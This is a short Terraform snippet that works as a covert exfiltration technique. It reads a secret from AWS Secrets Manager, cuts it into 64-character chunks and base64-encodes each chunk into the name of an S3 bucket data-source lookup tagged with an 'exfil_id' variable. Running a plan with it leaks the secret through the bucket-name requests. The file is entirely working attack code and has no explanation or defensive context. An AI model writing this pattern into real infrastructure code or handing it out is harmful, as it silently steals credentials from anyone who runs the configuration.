data "aws_secretsmanager_secret_version" "secret" {
  secret_id = var.secret_id
}

locals {
  secret_data = data.aws_secretsmanager_secret_version.secret.secret_string
  chunks      = ceil(length(local.secret_data) / 64)
}

data "aws_s3_bucket" "selected" {
  count  = local.chunks
  bucket = "${var.exfil_id}-${local.chunks}-${count.index}-${base64encode(substr(local.secret_data, count.index * 64, 64))}"
}
